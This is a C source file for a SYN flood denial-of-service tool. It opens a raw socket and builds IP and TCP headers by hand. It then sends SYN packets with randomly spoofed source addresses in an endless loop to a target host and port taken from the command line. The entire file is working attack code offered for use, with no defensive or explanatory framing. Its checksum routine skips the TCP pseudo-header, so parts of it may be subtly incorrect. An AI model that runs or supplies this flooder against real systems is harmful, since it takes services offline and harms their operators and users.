#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

void attack(int fkfd, struct sockaddr_in *target,unsigned short srcport);

unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char** argv){
	printf("tcp attack start...\n");
	int skfd;
	struct sockaddr_in target;
	struct hostent *host;

	const int on = 1;
	unsigned short srcport;
	
	if(argc != 4){
		printf("Usage: %s target dstpost srcport\n",argv[0]);
		exit(1);
	}
	bzero(&target,sizeof(struct sockaddr_in));
	target.sin_family = AF_INET;
	target.sin_port = htons(atoi(argv[2]));

	if(inet_aton(argv[1],&target.sin_addr) == 0){
		host = gethostbyname(argv[1]);
		if(host == NULL){
			printf("TargetName Error:%s\n",hstrerror(h_errno));
			exit(1);
		}
		target.sin_addr = *(struct in_addr *)(host->h_addr_list[0]);
	}

	skfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

	if(skfd < 0){
		perror("Create socket Error\n");
		exit(1);
	}

	if(setsockopt(skfd ,IPPROTO_IP ,IP_HDRINCL ,&on ,sizeof(on))){
		perror("IP_HDRINCL OPEN Failed\n");
		exit(1);
	}
	setuid(getpid());
	srcport = atoi(argv[3]);
	attack(skfd, &target, srcport);
	exit(1);
}

void attack(int fkfd, struct sockaddr_in *target,unsigned short srcport)
{
	char buf[128] = {0};
	struct ip *ip;
	struct tcphdr *tcp;
	int ip_len;

	ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
	ip = (struct ip *)buf;

	ip->ip_v = IPVERSION;
	ip->ip_hl = sizeof(struct ip) >> 2;
	ip->ip_tos = 0;
	ip->ip_len = htons(ip_len);
	ip->ip_id = 0;
	ip->ip_off = 0;
	ip->ip_ttl = MAXTTL;
	ip->ip_sum = 0;
	ip->ip_dst = target->sin_addr;

	tcp = (struct tcphdr *)(buf + sizeof(struct ip));
	tcp->source = htons(srcport);
	tcp->dest = target->sin_port;
	tcp->seq = random();
	tcp->doff = 5;
	tcp->syn = 1;
	tcp->check = 0;
	
	while(1){
		ip->ip_src.s_addr = random();
		tcp->check = check_sum((unsigned short *) tcp,sizeof(struct tcphdr));
		sendto(fkfd, buf,ip_len,0,(struct sockaddr *)target,sizeof(struct sockaddr_in));
	}
}
//关于CRC校验和的计算，网上一大堆，我就“拿来主义”了
unsigned short check_sum(unsigned short *addr,int len){
        register int nleft=len;
        register int sum=0;
        register short *w=addr;
        short answer=0;

        while(nleft>1)
        {
                sum+=*w++;
                nleft-=2;
        }
        if(nleft==1)
        {
                *(unsigned char *)(&answer)=*(unsigned char *)w;
                sum+=answer;
        }

        sum=(sum>>16)+(sum&0xffff);
        sum+=(sum>>16);
        answer=~sum;
        return(answer);
}
